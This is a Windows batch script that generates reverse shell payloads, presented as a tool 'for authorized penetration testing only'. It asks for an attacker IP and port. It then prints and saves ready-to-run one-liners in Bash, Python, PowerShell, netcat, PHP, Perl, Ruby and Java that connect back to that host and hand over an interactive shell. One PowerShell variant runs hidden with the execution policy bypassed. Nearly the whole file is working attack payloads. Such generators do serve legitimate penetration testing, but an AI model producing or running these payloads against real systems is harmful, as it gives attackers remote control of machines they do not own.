@echo off
setlocal enabledelayedexpansion

echo ========================================
echo Reverse Shell Generator
echo For Authorized Penetration Testing Only
echo ========================================
echo.

REM Get attacker IP
set /p LHOST="Enter your IP (LHOST): "
if "%LHOST%"=="" (
    echo ERROR: IP address required!
    pause
    exit /b 1
)

REM Get listening port
set /p LPORT="Enter listening port (LPORT): "
if "%LPORT%"=="" (
    echo ERROR: Port required!
    pause
    exit /b 1
)

REM Show menu
echo.
echo Select shell type:
echo.
echo [1]  Bash
echo [2]  Python
echo [3]  Python3
echo [4]  PowerShell
echo [5]  Netcat (nc)
echo [6]  Netcat (ncat)
echo [7]  PHP
echo [8]  Perl
echo [9]  Ruby
echo [10] Java
echo [11] Windows CMD
echo [12] All (show all options)
echo.
set /p CHOICE="Enter choice (1-12): "

echo.
echo ========================================
echo Generated Reverse Shell Payloads
echo ========================================
echo LHOST: %LHOST%
echo LPORT: %LPORT%
echo ========================================
echo.

REM Create output file
set OUTPUT=revshell_%LHOST%_%LPORT%.txt
echo ======================================== > %OUTPUT%
echo Reverse Shell Payloads >> %OUTPUT%
echo ======================================== >> %OUTPUT%
echo LHOST: %LHOST% >> %OUTPUT%
echo LPORT: %LPORT% >> %OUTPUT%
echo. >> %OUTPUT%

if "%CHOICE%"=="1" goto bash
if "%CHOICE%"=="2" goto python
if "%CHOICE%"=="3" goto python3
if "%CHOICE%"=="4" goto powershell
if "%CHOICE%"=="5" goto nc
if "%CHOICE%"=="6" goto ncat
if "%CHOICE%"=="7" goto php
if "%CHOICE%"=="8" goto perl
if "%CHOICE%"=="9" goto ruby
if "%CHOICE%"=="10" goto java
if "%CHOICE%"=="11" goto cmd
if "%CHOICE%"=="12" goto all

echo Invalid choice!
pause
exit /b 1

:bash
echo [Bash Reverse Shell]
echo bash -i ^>^& /dev/tcp/%LHOST%/%LPORT% 0^>^&1
echo.
echo bash -c 'bash -i ^>^& /dev/tcp/%LHOST%/%LPORT% 0^>^&1'
echo.
echo [Bash Reverse Shell] >> %OUTPUT%
echo bash -i ^>^& /dev/tcp/%LHOST%/%LPORT% 0^>^&1 >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto python

:python
echo [Python Reverse Shell]
echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%LHOST%",%LPORT%));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
echo.
echo [Python Reverse Shell] >> %OUTPUT%
echo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%LHOST%",%LPORT%));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto python3

:python3
echo [Python3 Reverse Shell]
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%LHOST%",%LPORT%));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
echo.
echo [Python3 Reverse Shell] >> %OUTPUT%
echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%LHOST%",%LPORT%));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto powershell

:powershell
echo [PowerShell Reverse Shell]
echo powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535^|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2^>^&1 ^| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '^> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
echo.
echo [PowerShell Reverse Shell] >> %OUTPUT%
echo powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT%);$stream = $client.GetStream();[byte[]]$bytes = 0..65535^|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2^>^&1 ^| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '^> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto nc

:nc
echo [Netcat Traditional]
echo nc -e /bin/sh %LHOST% %LPORT%
echo.
echo nc -e /bin/bash %LHOST% %LPORT%
echo.
echo [Netcat Traditional] >> %OUTPUT%
echo nc -e /bin/sh %LHOST% %LPORT% >> %OUTPUT%
echo nc -e /bin/bash %LHOST% %LPORT% >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto ncat

:ncat
echo [Netcat Without -e]
echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f^|/bin/sh -i 2^>^&1^|nc %LHOST% %LPORT% ^>/tmp/f
echo.
echo [Netcat Without -e] >> %OUTPUT%
echo rm /tmp/f;mkfifo /tmp/f;cat /tmp/f^|/bin/sh -i 2^>^&1^|nc %LHOST% %LPORT% ^>/tmp/f >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto php

:php
echo [PHP Reverse Shell]
echo php -r '$sock=fsockopen("%LHOST%",%LPORT%);exec("/bin/sh -i ^<^&3 ^>^&3 2^>^&3");'
echo.
echo [PHP Reverse Shell] >> %OUTPUT%
echo php -r '$sock=fsockopen("%LHOST%",%LPORT%);exec("/bin/sh -i ^<^&3 ^>^&3 2^>^&3");' >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto perl

:perl
echo [Perl Reverse Shell]
echo perl -e 'use Socket;$i="%LHOST%";$p=%LPORT%;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"^>^&S");open(STDOUT,"^>^&S");open(STDERR,"^>^&S");exec("/bin/sh -i");};'
echo.
echo [Perl Reverse Shell] >> %OUTPUT%
echo perl -e 'use Socket;$i="%LHOST%";$p=%LPORT%;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"^>^&S");open(STDOUT,"^>^&S");open(STDERR,"^>^&S");exec("/bin/sh -i");};' >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto ruby

:ruby
echo [Ruby Reverse Shell]
echo ruby -rsocket -e'f=TCPSocket.open("%LHOST%",%LPORT%).to_i;exec sprintf("/bin/sh -i ^<^&%%d ^>^&%%d 2^>^&%%d",f,f,f)'
echo.
echo [Ruby Reverse Shell] >> %OUTPUT%
echo ruby -rsocket -e'f=TCPSocket.open("%LHOST%",%LPORT%).to_i;exec sprintf("/bin/sh -i ^<^&%%d ^>^&%%d 2^>^&%%d",f,f,f)' >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto java

:java
echo [Java Reverse Shell]
echo r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5^<^>/dev/tcp/%LHOST%/%LPORT%;cat ^<^&5 ^| while read line; do \$line 2^>^&5 ^>^&5; done"] as String[]); p.waitFor();
echo.
echo [Java Reverse Shell] >> %OUTPUT%
echo r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5^<^>/dev/tcp/%LHOST%/%LPORT%;cat ^<^&5 ^| while read line; do \$line 2^>^&5 ^>^&5; done"] as String[]); p.waitFor(); >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto cmd

:cmd
echo [Windows CMD]
echo powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('%LHOST%', %LPORT%);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize ^| %% {0};$StreamWriter.Write($String + 'SHELL^> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2^>^&1 ^| Out-String} catch {$_ ^| Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
echo.
echo [Windows CMD] >> %OUTPUT%
echo powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('%LHOST%', %LPORT%);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize ^| %% {0};$StreamWriter.Write($String + 'SHELL^> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2^>^&1 ^| Out-String} catch {$_ ^| Out-String}WriteToStream ($Output)}$StreamWriter.Close()" >> %OUTPUT%
echo. >> %OUTPUT%
if not "%CHOICE%"=="12" goto copy_and_end
goto all_done

:all
call :bash
call :python
call :python3
call :powershell
call :nc
call :ncat
call :php
call :perl
call :ruby
call :java
call :cmd

:all_done
echo ========================================
echo.
echo All payloads saved to: %OUTPUT%
echo.
echo Remember to start your listener first:
echo   nc -lvnp %LPORT%
echo.
pause
exit /b 0

:copy_and_end
echo ========================================
echo.
echo Payload saved to: %OUTPUT%
echo.
echo Remember to start your listener first:
echo   nc -lvnp %LPORT%
echo.
echo ⚠ WARNING: Use only on systems you have authorization to test!
echo ========================================
pause
endlocal